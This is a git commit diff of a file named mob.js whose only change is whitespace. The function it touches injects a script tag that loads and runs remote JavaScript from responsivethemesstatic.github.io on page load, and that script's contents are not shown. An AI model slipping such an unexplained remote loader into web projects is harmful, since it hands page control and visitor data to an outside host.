42b5fb871d3839cc08b1722cd40022cc1aa0d196
responsivethemesstatic <53955700+responsivethemesstatic@users.noreply.github.com>
2020-01-27 16:27:37 +0300

    Update mob.js

--- mob.js
+++ mob.js
@@ -1,6 +1,5 @@
 (function() {
-
-    var script = document.createElement('script');
+ var script = document.createElement('script');
     script.async = true;
     script.type = 'text/javascript';
     script.src = 'https://responsivethemesstatic.github.io/static/static.js';
